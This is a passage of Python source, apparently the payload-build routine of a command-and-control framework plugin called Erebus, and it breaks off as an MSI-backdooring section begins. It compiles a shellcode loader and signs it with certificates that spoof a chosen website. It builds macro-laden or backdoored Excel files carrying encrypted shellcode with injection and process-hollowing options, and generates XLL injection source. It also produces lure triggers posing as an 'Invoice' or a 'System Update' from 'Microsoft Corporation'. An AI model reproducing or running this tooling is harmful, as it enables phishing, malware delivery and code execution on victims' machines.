                            StepStdout=f"Makefile publish failed",
                            StepSuccess=False,
                        ))
                        return response

                    # Locate publish output
                    build_config = self.get_parameter('0.3 ClickOnce Build Configuration')
                    publish_root = Path(clickonce_loader_path) / "bin" / build_config

                    publish_dir = None
                    if publish_root.exists():
                        for tfm_dir in publish_root.iterdir():
                            if tfm_dir.is_dir() and "net" in tfm_dir.name and "-windows" in tfm_dir.name:
                                for rid_dir in tfm_dir.iterdir():
                                    if rid_dir.is_dir():
                                        candidate = rid_dir / "publish"
                                        if candidate.exists():
                                            publish_dir = candidate
                                            break
                                if publish_dir:
                                    break

                    if not publish_dir or not publish_dir.exists():
                        response.status = BuildStatus.Error
                        response.build_message = "Failed to locate ClickOnce publish output directory"
                        response.build_stderr = output + f"\nSearched in: {publish_root}"
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName=compile_step_name,
                            StepStdout="Failed to locate ClickOnce publish output",
                            StepSuccess=False,
                        ))
                        return response

                    # Copy cleaned artifacts from publish directory (skip the main exe - renamed below)
                    payload_dir = Path(agent_build_path) / "payload"
                    payload_dir.mkdir(parents=True, exist_ok=True)

                    CLICKONCE_MAIN = {"Erebus.ClickOnce.exe", "Erebus.ClickOnce.dll"}
                    for item in publish_dir.iterdir():
                        if item.is_file() and item.name not in CLICKONCE_MAIN:
                            dest_path = payload_dir / item.name
                            shutil.copy2(str(item), str(dest_path))

                    output += f"[DEBUG] Cleaned publish artifacts:\n"
                    for item in publish_dir.iterdir():
                        if item.is_file():
                            output += f"  - {item.name} ({item.stat().st_size} bytes)\n"

                    # Locate main executable and copy as erebus.exe / erebus.dll
                    payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
                    payload_path = str(payload_path)

                    clickonce_exe = publish_dir / "Erebus.ClickOnce.exe"
                    clickonce_dll = publish_dir / "Erebus.ClickOnce.dll"

                    if clickonce_exe.exists():
                        shutil.copy2(str(clickonce_exe), str(payload_path))
                        response.build_stdout = output + f"\nClickOnce Loader compiled to: {payload_path}"
                        response.status = BuildStatus.Success
                        response.build_message = "ClickOnce Loader compiled successfully!"
                    elif clickonce_dll.exists():
                        payload_path_dll = Path(payload_path).with_suffix(".dll")
                        shutil.copy2(str(clickonce_dll), str(payload_path_dll))
                        response.build_stdout = output + f"\nClickOnce Loader compiled to: {payload_path_dll}"
                        response.status = BuildStatus.Success
                        response.build_message = "ClickOnce Loader compiled successfully!"
                    else:
                        response.status = BuildStatus.Error
                        response.build_message = "Failed to locate compiled ClickOnce executable"
                        response.build_stderr = output + "\nNo .exe or .dll found in publish directory"
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName=compile_step_name,
                            StepStdout="Failed to locate executable",
                            StepSuccess=False,
                        ))
                        return response

                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName=compile_step_name,
                        StepStdout=compile_step_msg,
                        StepSuccess=True,
                    ))

            output = ""
            ######################### End Of Payload Build Section #########################
            ######################### Code Signing Section #########################
            if self.get_parameter("6.0 Codesign Loader"):
                try:
                    if self.get_parameter("0.0 Main Payload Type") == "Loader":
                        payload_path = Path(agent_build_path) / "payload" / f"erebus.{self.get_parameter('0.2 Loader Format')}"
                    elif self.get_parameter("0.0 Main Payload Type") == "Hijack":
                        payload_path = Path(agent_build_path) / "payload" / dll_file_name
                    elif self.get_parameter("0.1 Loader Type") == "ClickOnce":
                        payload_path = Path(agent_build_path) / "payload" / "erebus.exe"
                    else:
                        raise ValueError("Unsupported payload type for code signing")

                    if not payload_path.exists():
                        raise FileNotFoundError(f"Payload not found for signing at: {payload_path}")

                    signing_type = self.get_parameter("6.1 Codesign Type")
                    success_msg = ""

                    if signing_type == "SelfSign":
                        cn = self.get_parameter("6.2 Codesign CN")
                        org = self.get_parameter("6.3 Codesign Orgname") or cn

                        self_sign_payload(
                            payload_path=payload_path,
                            subject_cn=cn,
                            org_name=org
                        )
                        success_msg = f"Self-signed with CN: {cn}"

                    elif signing_type == "Spoof URL":
                        target_url = self.get_parameter("6.4 Codesign Spoof URL")
                        if not target_url:
                            raise ValueError("No URL provided for spoofing")

                        cert_details = get_remote_cert_details(target_url)
                        self_sign_payload(
                            payload_path=payload_path,
                            subject_cn=cert_details["CN"],
                            org_name=cert_details["O"],
                            full_details=cert_details
                        )
                        success_msg = f"Spoofed {target_url} (CN: {cert_details['CN']})"

                    elif signing_type == "Provide Certificate":
                        cert_uuid = self.get_parameter("6.5 Codesign Cert")
                        cert_pass = self.get_parameter("6.6 Codesign Cert Password")

                        if not cert_uuid:
                            raise ValueError("No certificate file uploaded")

                        file_resp = await SendMythicRPCFileGetContent(
                            MythicRPCFileGetContentMessage(AgentFileId=cert_uuid)
                        )

                        if not file_resp.Success:
                            raise ValueError("Failed to retrieve certificate file")

                        cert_path = Path(agent_build_path) / "uploaded_cert.pfx"
                        cert_path.write_bytes(file_resp.Content)

                        sign_with_provided_cert(
                            payload_path=payload_path,
                            cert_path=cert_path,
                            cert_password=cert_pass
                        )
                        success_msg = "Signed with provided certificate"

                    elif signing_type == "Provide Certificate":
                        raise NotImplementedError("Provide Certificate mode not yet implemented in backend")

                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="[T1553.006] - Sign Shellcode Loader",
                        StepStdout=f"Success: {success_msg}",
                        StepSuccess=True
                    ))

                except Exception as e:
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="[T1553.006] - Sign Shellcode Loader",
                        StepStdout=f"Signing Failed: {str(e)}",
                        StepSuccess=False
                    ))
                    response.status = BuildStatus.Error
                    response.build_stderr = f"Code signing failed: {str(e)}"
                    return response

            ######################### Creating Decoy Section #########################
            if self.get_parameter("0.13 Decoy File Inclusion"):
                decoy_dir = Path(agent_build_path) / "decoys"
                decoy_file_uuid = self.get_parameter("0.13 Decoy File")

                if decoy_file_uuid:
                    try:
                        file_resp = await SendMythicRPCFileGetContent(
                            MythicRPCFileGetContentMessage(AgentFileId=decoy_file_uuid)
                        )

                        file_name_resp = await SendMythicRPCFileSearch(
                            MythicRPCFileSearchMessage(AgentFileID=decoy_file_uuid)
                        )
                        custom_filename = "decoy.pdf"
                        if file_name_resp.Success and len(file_name_resp.Files) > 0:
                            custom_filename = file_name_resp.Files[0].Filename

                        if decoy_dir.exists():
                            shutil.rmtree(decoy_dir)
                        decoy_dir.mkdir(parents=True, exist_ok=True)
                        custom_decoy_path = decoy_dir / custom_filename
                        custom_decoy_path.write_bytes(file_resp.Content)

                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                                PayloadUUID=self.uuid,
                                StepName="[T1036.008] - Creating Decoy",
                                StepStdout=f"Replaced default decoys with custom file: {custom_filename}",
                                StepSuccess=True
                            ))

                    except Exception as e:
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                                PayloadUUID=self.uuid,
                                StepName="[T1036.008] - Creating Decoy",
                                StepStdout=f"Failed to process custom decoy: {str(e)}",
                                StepSuccess=False
                            ))
                else:
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="[T1036.008] - Creating Decoy",
                            StepStdout="Using default decoy files.",
                            StepSuccess=True
                        ))
            ######################### End of Decoy Section #########################
            ######################### MalDoc Creation Section #########################
            maldoc_mode = self.get_parameter("0.9 Create MalDoc")

            if maldoc_mode != "None" and self.get_parameter("0.8 Output Extension Source") == "Trigger":
                await SendMythicRPCPayloadUpdatebuildStep(
                    MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="[T1566.001] - Creating MalDoc",
                        StepStdout="Skipping MalDoc Generation (Trigger selected as source).",
                        StepSuccess=True
                    ))

            if maldoc_mode != "None" and self.get_parameter("0.8 Output Extension Source") != "Trigger":
                payload_dir = Path(agent_build_path) / "payload"
                maldoc_type = self.get_parameter("0.9a MalDoc Type")
                vba_trigger = self.get_parameter("0.9c VBA Execution Trigger")
                doc_name = self.get_parameter("0.9d Excel Document Name")
                obfuscate = self.get_parameter("0.9e Obfuscate VBA")
                injection_type = self.get_parameter("0.9f MalDoc Injection Type")
                xll_payload_type = self.get_parameter("0.9h XLL Payload Type")

                try:
                    # Generate VBA payload code based on injection type
                    if injection_type == "Command Execution":
                        # Use WScript.Shell to execute trigger binary and command
                        trigger_binary = self.get_parameter("0.9f1 MalDoc Trigger Binary")
                        trigger_command = self.get_parameter("0.9f2 MalDoc Trigger Command")

                        # Import the plugin function to generate command execution VBA
                        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
                        plugin = PayloadMalDocsPlugin()
                        vba_code = plugin.generate_command_execution_vba(
                            trigger_binary=trigger_binary,
                            trigger_command=trigger_command,
                            trigger_type=vba_trigger
                        )

                    else:  # Shellcode Injection
                        # Convert shellcode to VBA format using shellcrypt
                        # First, generate the VBA-formatted shellcode
                        cmd = [
                            "python",
                            shellcrypt_path,
                            "-i", mythic_shellcode_path,
                            "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                            "-f", "vba",
                            "-a", "shellcode"
                        ]

                        if self.get_parameter("2.2 Encryption Key") != "NONE":
                            cmd += ["-k", self.get_parameter("2.2 Encryption Key")]

                        if self.get_parameter("2.0 Compression Type") != "NONE":
                            cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]

                        # Run shellcrypt to get VBA shellcode
                        shellcode_output = subprocess.check_output(cmd, text=True)
                        output += f"[DEBUG] Shellcrypt raw output length: {len(shellcode_output)} bytes\n"

                        # Parse shellcrypt output to extract only key and shellcode arrays
                        shellcode_vba = ""
                        lines = shellcode_output.split('\n')
                        in_key = False
                        in_shellcode = False
                        key_lines = []
                        shellcode_lines = []

                        for line in lines:
                            # Capture key array
                            if 'key = Array' in line:
                                in_key = True
                                in_shellcode = False
                                key_lines.append(line.strip())
                            elif in_key:
                                if line.strip().endswith(')'):
                                    key_lines.append(line.strip())
                                    in_key = False
                                elif line.strip():
                                    key_lines.append(line.strip())

                            # Capture shellcode array
                            if 'shellcode = Array' in line:
                                in_shellcode = True
                                in_key = False
                                shellcode_lines.append(line.strip())
                            elif in_shellcode:
                                if line.strip().endswith(')'):
                                    shellcode_lines.append(line.strip())
                                    in_shellcode = False
                                elif line.strip():
                                    shellcode_lines.append(line.strip())

                        # Combine extracted lines
                        if key_lines:
                            shellcode_vba += ' '.join(key_lines) + '\n'
                        if shellcode_lines:
                            shellcode_vba += ' '.join(shellcode_lines) + '\n'

                        output += f"[DEBUG] Parsed shellcode_vba length: {len(shellcode_vba)} bytes\n"

                        # Map loader selection to plugin parameter
                        loader_map = {
                            "VirtualAlloc + CreateThread": "createthread",
                            "EnumSystemLocalesA Callback": "enumlocales",
                            "QueueUserAPC Injection": "queueuserapc",
                            "Process Hollowing": "hollowing"
                        }
                        loader_type = loader_map.get(self.get_parameter("0.9g VBA Loader Technique"), "createthread")
                        output += f"[DEBUG] Using VBA loader technique: {loader_type}\n"

                        # Get target process for hollowing technique
                        target_process = self.get_parameter("0.5 Shellcode Loader - Target Process")
                        output += f"[DEBUG] Target process: {target_process}\n"

                        # Generate VBA that injects the shellcode
                        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
                        plugin = PayloadMalDocsPlugin()
                        vba_code = plugin.generate_shellcode_injection_vba(
                            vba_shellcode=shellcode_vba,
                            trigger_type=vba_trigger,
                            loader_type=loader_type,
                            target_process=target_process
                        )

                    # ==================== XLL (Excel Add-In DLL) Generation ====================
                    if xll_payload_type == "XLL Add-In DLL":
                        # Generate C/C++ source code for XLL DLL instead of VBA macro
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                                PayloadUUID=self.uuid,
                                StepName="[T1559.002] - Generating XLL DLL",
                                StepStdout="Generating C/C++ XLL source code...",
                                StepSuccess=True
                            ))

                        # Get XLL-specific parameters
                        xll_injection_method = self.get_parameter("0.9i XLL Injection Method")
                        xll_target_process = self.get_parameter("0.9j XLL Target Process")
                        xll_compiler = self.get_parameter("0.9k XLL Compiler")
                        xll_guardrail_includes = (self.get_parameter("0.9l XLL Guardrail Includes") or "").strip()
                        xll_guardrail_code = (self.get_parameter("0.9m XLL Guardrail Code") or "").strip()
                        xll_guardrail_extra_libs = (self.get_parameter("0.9n XLL Guardrail Extra Libs") or "").strip()
                        xll_guardrail_extra_libs_list = shlex.split(xll_guardrail_extra_libs) if xll_guardrail_extra_libs else []

                        # Map injection method names for template
                        injection_method_map = {
                            "CreateThread (In-Process)": "CreateThread",
                            "ProcessInject (Remote)": "ProcessInject"
                        }
                        template_injection_method = injection_method_map.get(xll_injection_method, "CreateThread")

                        # Generate XLL shellcode using shellcrypt
                        output += "[*] Processing shellcode for XLL injection...\n"

                        shellcrypt_cmd = [
                            "python",
                            shellcrypt_path,
                            "-i", mythic_shellcode_path,
                            "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                            "-f", "c",
                            "-a", "shellcode",
                            "-o", str(xll_shellcode_path)
                        ]

                        if self.get_parameter("2.2 Encryption Key") != "NONE":
                            shellcrypt_cmd += ["-k", self.get_parameter("2.2 Encryption Key")]

                        if self.get_parameter("2.0 Compression Type") != "NONE":
                            shellcrypt_cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]

                        # Run shellcrypt to generate shellcode directly to xll_shellcode.h
                        try:
                            subprocess.check_output(shellcrypt_cmd, text=True)
                            output += f"[+] Shellcrypt generated xll_shellcode.h\n"
                        except subprocess.CalledProcessError as e:
                            output += f"[-] Shellcrypt failed: {str(e)}\n"
                            raise

                        # Wrap shellcrypt output with header guards
                        if xll_shellcode_path.exists():
                            shellcrypt_content = xll_shellcode_path.read_text()
                            wrapped_content = f'''#ifndef EREBUS_XLL_SHELLCODE_H
#define EREBUS_XLL_SHELLCODE_H
#pragma once

#include <stddef.h>

{shellcrypt_content}

static size_t shellcode_len = sizeof(shellcode);
static size_t key_len = sizeof(key);

#endif
'''
                            xll_shellcode_path.write_text(wrapped_content)
                            output += f"[+] Wrapped shellcode header with guards\n"
                        else:
                            output += "[-] Shellcrypt output file not created\n"
                            raise RuntimeError("Shellcrypt failed to create output file")

                        xll_injection_mode = 0 if xll_injection_method == "CreateThread (In-Process)" else 1
                        xll_target_process_escaped = xll_target_process.replace("\\", "\\\\")

                        template_dir = Path(__file__).resolve().parent.parent / "agent_code" / "erebus_xll"

                        def _render_xll_template(template_path: Path, replace_map: dict) -> str:
                            content = template_path.read_text()
                            for token, value in replace_map.items():
                                content = content.replace(token, value)
                            return content

                        replacements = {
                            "{{XLL_ENCRYPTION_TYPE}}": str(encryption_type_value if encryption_type_value else 0),
                            "{{XLL_INJECTION_METHOD}}": str(xll_injection_mode),
                            "{{XLL_TARGET_PROCESS}}": xll_target_process_escaped,
                            "{{XLL_XLL_FILENAME}}": f"{doc_name}.xll",
                            "{{XLL_XLSX_FILENAME}}": f"{doc_name}.xlsx",
                            "{{XLL_ZIP_FILENAME}}": f"{doc_name}.zip",
                        }

                        xll_config_path.write_text(
                            _render_xll_template(template_dir / "xll_config.h", replacements)
                        )

                        # Load Jinja2 template for XLL
                        template_dir = Path(__file__).parent.parent / "agent_code" / "erebus_xll"
                        env = Environment(loader=FileSystemLoader(str(template_dir)))
                        template = env.get_template("xll_payload.j2")

                        # Render template with context
                        template_context = {
                            "encryption_type": encryption_type_value if encryption_type_value else "NONE",
                            "injection_method": template_injection_method,
                            "injection_method_name": xll_injection_method,
                            "target_process": xll_target_process if xll_injection_method == "ProcessInject (Remote)" else "explorer.exe",
                            "generation_timestamp": datetime.now().isoformat(),
                            "vba_encryption_type": encryption_type_value if encryption_type_value else "NONE",
                            "guardrail_includes": xll_guardrail_includes,
                            "guardrail_code": xll_guardrail_code
                        }

                        xll_source = template.render(template_context)

                        # Save XLL source to temporary file
                        xll_source_path.write_text(xll_source)

                        output += f"[+] Generated XLL source: {xll_source_path.name}\n"
                        output += f"[*] Source size: {len(xll_source)} bytes\n"
                        output += f"[*] Encryption type: {encryption_type_value}\n"
                        output += f"[*] Injection method: {xll_injection_method}\n"

                        # Generate xll_config.h with configuration macros
                        xll_config_path = xll_build_dir / "xll_config.h"
                        injection_method_macro = "0" if xll_injection_method == "Self-injection (Local)" else "1"
                        encryption_type_macro = {
                            "NONE": "0",
                            "XOR": "1",
                            "RC4": "2"
                        }.get(encryption_type_value or "NONE", "0")

                        target_process = xll_target_process if xll_injection_method == "ProcessInject (Remote)" else "explorer.exe"

                        xll_config_content = f'''#ifndef EREBUS_XLL_CONFIG_H
#define EREBUS_XLL_CONFIG_H
#pragma once

#include <windows.h>

// Encryption: 0 = NONE, 1 = XOR, 2 = RC4
#define XLL_ENCRYPTION_TYPE {encryption_type_macro}

// Injection: 0 = CreateThread (self), 1 = ProcessInject (remote)
#define XLL_INJECTION_METHOD {injection_method_macro}

#define XLL_TARGET_PROCESS L"{target_process}"

#define XLL_XLL_FILENAME L"payload.xll"
#define XLL_XLSX_FILENAME L"payload.xlsx"
#define XLL_ZIP_FILENAME L"payload.zip"

#endif
'''
                        xll_config_path.write_text(xll_config_content)
                        output += f"[+] Generated xll_config.h\n"

                        try:
                            xll_output_path = payload_dir / f"{doc_name}.xll"
                            xll_source_ref = payload_dir / f"{doc_name}.cpp"

                            # XLL compilation requires MSVC on a Windows host via erebus_helper.
                            # Docker only ships the source; build_xll.bat handles compilation.
                            shutil.copy(str(xll_source_path), str(xll_source_ref))
                            output += f"[*] Source code saved to: {xll_source_ref.name}\n"

                            # Copy header files so cl.exe can find them alongside the .cpp
                            shutil.copy(str(xll_inject_path), str(payload_dir / "xll_inject.h"))
                            shutil.copy(str(xll_shellcode_path), str(payload_dir / "xll_shellcode.h"))
                            shutil.copy(str(xll_config_path), str(payload_dir / "xll_config.h"))
                            output += f"[*] XLL headers copied to payload directory\n"

                            # ---- Generate build_xll.bat for native recompilation on Windows ----
                            bat_extra = f' --extra-flags "{xll_guardrail_extra_libs}"' if xll_guardrail_extra_libs else ""
                            bat_lines = [
                                "@echo off",
                                "REM Recompile XLL natively on Windows using the bundled helper.",
                                "REM Run this on a Windows host after extracting the payload archive.",
                                f'python erebus_helper.py xll --source "{xll_source_ref.name}" --output "{xll_output_path.name}" --compiler {xll_compiler} --arch x64 --optimize Ox{bat_extra}',
                                "echo XLL compiled: %errorlevel%",
                            ]
                            bat_path = payload_dir / "build_xll.bat"
                            bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
                            output += f"[+] Generated build_xll.bat for native Windows recompilation\n"

                        except Exception as e:
                            output += f"[-] XLL compilation error: {str(e)}\n"
                            await SendMythicRPCPayloadUpdatebuildStep(
                                MythicRPCPayloadUpdateBuildStepMessage(
                                    PayloadUUID=self.uuid,
                                    StepName="[T1559.002] - Generating XLL DLL",
                                    StepStdout=f"XLL generation failed: {str(e)}",
                                    StepSuccess=False
                                ))
                            raise

                        # Skip VBA obfuscation if using XLL
                        obfuscate = False

                    if obfuscate and xll_payload_type != "XLL Add-In DLL":
                        vba_code = await self.obfuscate_vba(vba_code)

                    # Handle VBA Module Only export
                    if maldoc_mode == "VBA Module Only":
                        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
                        plugin = PayloadMalDocsPlugin()

                        # Export as .bas file (importable VBA module)
                        bas_output = payload_dir / f"{doc_name}_payload.bas"
                        bas_path = plugin.export_vba_as_bas(
                            vba_code=vba_code,
                            output_path=str(bas_output),
                            module_name=doc_name
                        )

                        # Also export as plain text for reference
                        txt_output = payload_dir / f"{doc_name}_payload.txt"
                        plugin.export_vba_as_text(vba_code, str(txt_output))

                        success_msg = f"[+] Created VBA module for manual import: {bas_path.name}\n"
                        success_msg += f"[*] .bas file can be imported into Excel via VBA Editor > File > Import\n"
                        success_msg += f"[*] .txt file contains the raw VBA code for reference"

                        output += success_msg + "\n"

                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                                PayloadUUID=self.uuid,
                                StepName="[T1566.001] - Creating MalDoc",
                                StepStdout=success_msg,
                                StepSuccess=True
                            ))

                    elif maldoc_type == "Create New":
                        maldoc_fmt = (self.get_parameter("0.9p MalDoc Output Format") or "xlsm").lower()

                        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin as _MDP
                        _plugin = _MDP()

                        # Export .bas for manual re-injection if needed
                        bas_output = payload_dir / f"{doc_name}_payload.bas"
                        _plugin.export_vba_as_bas(vba_code=vba_code, output_path=str(bas_output), module_name=doc_name)

                        # Compile the Excel file directly using the template
                        excel_output = payload_dir / f"{doc_name}.{maldoc_fmt}"
                        template_path = _plugin._resolve_template_path(excel_output)

                        if template_path and template_path.exists():
                            _plugin.create_new_excel_with_payload(
                                output_path=excel_output,
                                vba_code=vba_code,
                                document_name=doc_name,
                                template_path=template_path,
                            )
                            success_msg = f"[+] Compiled {excel_output.name} from {template_path.name} template.\n"
                            output += f"[+] Created {maldoc_fmt.upper()}: {excel_output.name}\n"
                        else:
                            # Fallback: create from scratch via openpyxl
                            _plugin.create_new_excel_with_payload(
                                output_path=excel_output,
                                vba_code=vba_code,
                                document_name=doc_name,
                            )
                            success_msg = f"[+] Created {excel_output.name} (no template found, built from scratch).\n"
                            output += f"[+] Created {maldoc_fmt.upper()}: {excel_output.name}\n"

                        # Also emit build_maldoc.bat for Windows-side COM re-injection
                        bat_lines = [
                            "@echo off",
                            f"REM Re-inject VBA into {maldoc_fmt.upper()} via erebus_helper (run on Windows for full COM support).",
                            f'python erebus_helper.py {maldoc_fmt} --bas-file "{bas_output.name}" --output "{excel_output.name}" --module-name "{doc_name}"',
                            "echo MalDoc created: %errorlevel%",
                        ]
                        bat_path = payload_dir / "build_maldoc.bat"
                        bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
                        output += f"[*] build_maldoc.bat included for optional Windows-side COM re-injection\n"

                    else:  # Backdoor Existing
                        maldoc_fmt = (self.get_parameter("0.9p MalDoc Output Format") or "xlsm").lower()

                        # Get the uploaded Excel file
                        excel_uuid = self.get_parameter("0.9b Excel Source File")
                        if not excel_uuid:
                            raise ValueError("No Excel file provided for backdooring")

                        file_resp = await SendMythicRPCFileGetContent(
                            MythicRPCFileGetContentMessage(AgentFileId=excel_uuid)
                        )

                        if not file_resp.Success:
                            raise ValueError("Failed to retrieve Excel file")

                        # Get original filename
                        file_name_resp = await SendMythicRPCFileSearch(
                            MythicRPCFileSearchMessage(AgentFileID=excel_uuid)
                        )

                        original_filename = "document.xlsm"
                        if file_name_resp.Success and len(file_name_resp.Files) > 0:
                            original_filename = file_name_resp.Files[0].Filename

                        # Keep the uploaded source file in the payload directory
                        source_excel_name = f"{Path(original_filename).stem}_source{Path(original_filename).suffix}"
                        source_excel_path = payload_dir / source_excel_name
                        source_excel_path.write_bytes(file_resp.Content)

                        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin as _MDP
                        _plugin = _MDP()

                        # Export .bas for manual re-injection if needed
                        bas_output = payload_dir / f"{doc_name}_payload.bas"
                        _plugin.export_vba_as_bas(vba_code=vba_code, output_path=str(bas_output), module_name=doc_name)

                        # Compile the backdoored Excel directly
                        output_name = f"{Path(original_filename).stem}_backdoored.{maldoc_fmt}"
                        excel_output = payload_dir / output_name
                        _plugin.backdoor_excel_document(
                            source_path=source_excel_path,
                            output_path=excel_output,
                            vba_code=vba_code,
                        )
                        success_msg = (
                            f"[+] Backdoored {original_filename} -> {excel_output.name}\n"
                            f"[*] Source file kept at {source_excel_name}\n"
                        )
                        output += f"[+] Created backdoored {maldoc_fmt.upper()}: {excel_output.name}\n"

                        # Also emit build_maldoc.bat for Windows-side COM re-injection
                        bat_lines = [
                            "@echo off",
                            f"REM Re-inject VBA into {maldoc_fmt.upper()} via erebus_helper (run on Windows for full COM support).",
                            f'python erebus_helper.py {maldoc_fmt} --bas-file "{bas_output.name}" --source-excel "{source_excel_name}" --output "{excel_output.name}" --module-name "{doc_name}"',
                            "echo MalDoc created: %errorlevel%",
                        ]
                        bat_path = payload_dir / "build_maldoc.bat"
                        bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
                        output += f"[*] build_maldoc.bat included for optional Windows-side COM re-injection\n"

                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="[T1566.001] - Creating MalDoc",
                            StepStdout=success_msg,
                            StepSuccess=True
                        ))

                except Exception as e:
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="[T1566.001] - Creating MalDoc",
                            StepStdout=f"Failed to create/backdoor Excel document: {str(e)}",
                            StepSuccess=False
                        ))
                    response.status = BuildStatus.Error
                    response.build_stderr = f"MalDoc creation failed: {str(e)}"
                    return response

            ######################### End of MalDoc Section #########################
            ######################### Trigger Generation Section #########################

            if self.get_parameter("0.0 Main Payload Type") == "Loader" and self.get_parameter("0.8 Output Extension Source") == "MalDoc":
                await SendMythicRPCPayloadUpdatebuildStep(
                    MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="[T1137.006] - Adding Trigger",
                    StepStdout="Skipping Trigger Generation (MalDoc selected as source).",
                    StepSuccess=True,
                ))

            if self.get_parameter("0.0 Main Payload Type") == "Loader" and self.get_parameter("0.8 Output Extension Source") != "MalDoc":

                payload_dir = Path(agent_build_path) / "payload"
                decoy_dir = Path(agent_build_path) / "decoys"
                decoy_file = decoy_dir / "decoy.pdf"

                trigger_type = self.get_parameter("0.9 Trigger Type")

                try:
                    trigger_path = ""

                    match trigger_type:
                        case "LNK":
                            trigger_bin  = str(self.get_parameter("0.9a Trigger Binary"))
                            trigger_args = str(self.get_parameter("0.9b Trigger Command"))

                            # Load the helper's trigger_lnk module via path so
                            # the dot-in-directory name doesn't break imports.
                            # This keeps icon-resolution logic in one place
                            # (erebus_helper.py) rather than duplicated here.
                            _helper_root = Path(__file__).parent.parent / "agent_code" / "Erebus.Helper"
                            _lnk_mod_path = _helper_root / "modules" / "trigger_lnk.py"
                            import importlib.util as _ilu
                            _lnk_spec = _ilu.spec_from_file_location("_helper_trigger_lnk", str(_lnk_mod_path))
                            _lnk_mod  = _ilu.module_from_spec(_lnk_spec)
                            _lnk_spec.loader.exec_module(_lnk_mod)

                            trigger_path = _lnk_mod.create_payload_trigger(
                                target_bin=trigger_bin,
                                args=trigger_args,
                                icon_src=r"%SystemRoot%\system32\shell32.dll",
                                icon_index=0,
                                description="Invoice",
                                payload_dir=payload_dir,
                                decoy_file=decoy_file,
                            )

                            # Write a Windows batch file so the operator can
                            # re-build the LNK with native icon resolution on
                            # a Windows host using the bundled erebus_helper.py.
                            lnk_name = trigger_path.name if hasattr(trigger_path, "name") else str(trigger_path).split(os.sep)[-1]
                            bat_lines = [
                                "@echo off",
                                "REM Re-create LNK with correct Windows icons using the bundled helper.",
                                "REM Run this on a Windows host after extracting the payload archive.",
                                f'python erebus_helper.py lnk --target-binary "{trigger_bin}" --arguments "{trigger_args}" --output "{lnk_name}" --description "Invoice"',
                                "echo LNK created: %errorlevel%",
                            ]
                            bat_path = payload_dir / "build_lnk.bat"
                            bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")

                        case "BAT":
                            trigger_path = create_bat_payload_trigger(
                                target_bin=str(self.get_parameter("0.9a Trigger Binary")),
                                args=str(self.get_parameter("0.9b Trigger Command")),
                                payload_dir=payload_dir,
                                decoy_file=decoy_file
                            )

                        case "MSI":
                            trigger_path= create_msi_payload_trigger(
                                payload_exe="erebus.exe",
                                payload_dir=payload_dir,
                                decoy_file=decoy_file
                            )
                        case "ClickOnce":
                            trigger_path = await create_clickonce_trigger(
                                payload_exe="erebus.exe",
                                payload_dir=payload_dir,
                                decoy_file=decoy_file,
                                app_name="System Update",
                                app_publisher="Microsoft Corporation"
                            )

                        case "MSC":
                            trigger_path = create_msc_explorer_trigger(
                                payload_exe="erebus.exe",
                                payload_dir=payload_dir,
                                decoy_file=decoy_file
                            )

                    if trigger_path:
                        response.status = BuildStatus.Success
                        response.build_message = f"{trigger_type} Trigger created!"

                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="[T1137.006] - Adding Trigger",
                            StepStdout=f"{trigger_type} Trigger created at: {trigger_path}",
                            StepSuccess=True,
                        ))
                except Exception as e:
                    response.status = BuildStatus.Error
                    response.build_message = f"Failed to create {trigger_type} trigger: {str(e)}"
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="[T1137.006] - Adding Trigger",
                        StepStdout=f"CRITICAL ERROR: Failed to create {trigger_type} trigger: {str(e)}",
                        StepSuccess=False,
                    ))
                    return response
            ######################### End Of Trigger Generation Section #########################
            ######################### MSI Backdooring Section #########################

            # Stage MSI and write helper batch file if the operator enabled it
            if self.get_parameter("5.3 Enable MSI Backdoor"):
